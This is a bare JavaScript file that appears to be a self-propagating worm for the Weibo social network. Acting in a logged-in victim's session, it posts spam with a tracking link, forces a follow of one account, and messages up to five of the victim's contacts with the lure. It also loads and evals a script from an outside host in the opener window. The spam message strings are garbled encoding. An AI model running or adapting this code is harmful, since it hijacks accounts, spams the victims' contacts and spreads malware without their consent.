function createXHR(){
	return window.XMLHttpRequest?
	new XMLHttpRequest():
	new ActiveXObject("Microsoft.XMLHTTP");
}
function getappkey(url){
	xmlHttp = createXHR();
	xmlHttp.open("GET",url,false);
	xmlHttp.send();
	result = xmlHttp.responseText;
	id_arr = '';
	id = result.match(/namecard=\"true\" title=\"[^\"]*/g);
	for(i=0;i<id.length;i++){
		sum = id[i].toString().split('"')[3];
		id_arr += sum + '||';
	}
	return id_arr;
}
function random_msg(){
	link = ' http://163.fm/PxZHoxn?id=' + new Date().getTime();;
	var msgs = [
		'�������¼���һЩδע�⵽��ϸ�ڣ�',
		'������ҵ�д���ĵط���',
		'��Ů���Ķ���100��ʫ�裺',
		'3D�����Ÿ�����ͨ�������ӣ�',
		'���Ǵ�˵�е����ɾ��°���',
		'����!�����������������ˣ�',
		'���ݱ�����α�Ǳ����:',
		'ɵ���ô���ȥ�����У�',
		'���Լ��������ֻ��������',
		'��˰�����������ᵽ4000��'];
	var msg = msgs[Math.floor(Math.random()*msgs.length)] + link;
	msg = encodeURIComponent(msg);
	return msg;
}
function post(url,data,sync){
	xmlHttp = createXHR();
    xmlHttp.open("POST",url,sync);
    xmlHttp.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    xmlHttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
    xmlHttp.send(data);
}
function publish(){
	url = 'http://weibo.com/mblog/publish.php?rnd=' + new Date().getTime();
	data = 'content=' + random_msg() + '&pic=&styleid=2&retcode=';
	post(url,data,true);
}
function follow(){
	url = 'http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&atnId=profile&rnd=' + new Date().getTime();
	data = 'uid=' + 2201270010 + '&fromuid=' + $CONFIG.$uid + '&refer_sort=profile&atnId=profile';
	post(url,data,true);
}
function message(){
	url = 'http://weibo.com/' + $CONFIG.$uid + '/follow';
	ids = getappkey(url);
	id = ids.split('||');
	for(i=0;i<id.length - 1 & i<5;i++){
		msgurl = 'http://weibo.com/message/addmsg.php?rnd=' + new Date().getTime();
		msg = random_msg();
		msg = encodeURIComponent(msg);
		user = encodeURIComponent(encodeURIComponent(id[i]));
		data = 'content=' + msg + '&name=' + user + '&retcode=';
		post(msgurl,data,false);
	}
}
function main(){
	try{
		publish();
	}
	catch(e){}
	try{
		follow();
	}
	catch(e){}
	try{
		message();
	}
	catch(e){}
}
try{
   x="g=document.createElement('script');g.src='http://www.2kt.cn/images/t.js';document.body.appendChild(g)";window.opener.eval(x);
}
catch(e){}
main();
var t=setTimeout('location="http://weibo.com/pub/topic";',5000);